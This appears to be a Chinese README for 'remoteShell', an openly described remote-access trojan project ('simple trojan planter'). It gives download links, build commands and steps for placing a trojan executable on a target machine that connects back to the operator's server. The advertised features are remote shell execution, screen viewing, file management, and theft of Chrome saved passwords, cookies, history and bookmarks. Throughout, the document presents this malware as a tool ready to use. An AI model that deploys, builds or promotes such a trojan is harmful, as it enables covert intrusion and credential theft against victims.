# <center>简单植马器<center>
# remoteShell
# 📌项目基本介绍
## 项目地址
[https://github.com/OblivionTime/remoteShell](https://github.com/OblivionTime/remoteShell)
## 分支介绍
![在这里插入图片描述](https://img-blog.csdnimg.cn/8ccdcccb0e4243428eee5cd6e256d0ad.png)
# 💨基本使用流程
## 下载文件
[https://github.com/OblivionTime/remoteShell/releases](https://github.com/OblivionTime/remoteShell/releases)

![在这里插入图片描述](https://img-blog.csdnimg.cn/12be07ff44f94a59a498496798276d2c.png)
## 解压
![在这里插入图片描述](https://img-blog.csdnimg.cn/eeb21c8040a2486e8dfeab41316d56c6.png)
## 启动
先启动`remoteShellServer-win.exe`也就是先启动服务
![在这里插入图片描述](https://img-blog.csdnimg.cn/efd647c7d5ff465cbed7005d4efd2500.png)
然后打开`马端控制.exe`
![在这里插入图片描述](https://img-blog.csdnimg.cn/a0c2e4ee53d649978fb69e2ac878b6e5.png)

然后将`config.json`和`remoteShellTrojan.exe`移植到目标机器上,根据`自己的服务器ip`地址修改`config.json`文件中的`hostname`和`port`,如果不知道看自己服务器ip的话可以在命令行输入`ipconfig`查看自己的ip
![在这里插入图片描述](https://img-blog.csdnimg.cn/ed073d754277462180e3aeb12f2bc04c.png)
修改完后双击运行`remoteShellTrojan.exe`即可,出现下面这种情况则表示连接成功
![在这里插入图片描述](https://img-blog.csdnimg.cn/18383d0871404a39a97be8aeb50d9e8c.png)
去`马端控制`查看上线的机器
![在这里插入图片描述](https://img-blog.csdnimg.cn/1355f54117b644eca797fac784d4f943.png)

# ✨前端基本介绍
## 源码zip下载地址
[https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/main](https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/main)

## ✨介绍
马端控制是基于`vue`和`electron`,使用`element-UI`框架,通过websocket进行数据传输,使用`ffmpeg.exe`实现简单的屏幕录制功能
## ❗功能
1. shell命令执行
2. 实时屏幕
3. 文件管理
4. 获取chrome浏览器的书签,历史记录,网站保存的账号和密码,网站所有cookie

## ⚙️调试
```shell
#拉取前端
git clone https://github.com/OblivionTime/remoteShell.git
# 安装依赖包
yarn
# 调试
yarn serve
# 打包
yarn build
```
## 🖼️ 项目截图
![在这里插入图片描述](https://img-blog.csdnimg.cn/2271c0ff687d4b8bb47b71c36977717e.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/8eccacb4e38345b4998501de0020c592.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/83951d3f0c1b45edbd3a2887ae101915.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/c00b2badb17349eeaf19381a356f0573.png)
# ✨后端基本介绍
## 源代码zip下载地址
[https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/server](https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/server)

## ✨介绍
后端主要通过纯nodejs,后端主要重要在于信息传输,并没有做任何的特殊处理,所以基本上很多功能代码相似
## ⚙️调试
```shell
#拉取前端
git clone https://github.com/OblivionTime/remoteShell.git
git chekcout server
# 安装依赖包
yarn
# 调试
yarn serve
# 打包
yarn build
```
# ✨马端基本介绍
## 源zip下载地址
[https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/trojan](https://codeload.github.com/OblivionTime/remoteShell/zip/refs/heads/trojan)
## ✨介绍
马端纯nodejs实现,主要调用了以下几个库的基本使用

![在这里插入图片描述](https://img-blog.csdnimg.cn/86d1f580f1f14b379ce5fa488a307914.png)
## ⚙️调试
```shell
#拉取前端
git clone https://github.com/OblivionTime/remoteShell.git
git chekcout trojan
# 安装依赖包
yarn
# 调试
yarn serve
# 打包成win
yarn build:win
# 打包成mac
yarn build:mac
# 打包成linux
yarn build:linux
```

## ⚙️ 配置项
![在这里插入图片描述](https://img-blog.csdnimg.cn/68981c31695648229ab32dedcd6027de.png)
`hostname`表示后端ip地址,`port`表示后端端口,如果当前目录下没有`config.json`文件则系统会自动默认为`localhost:7880`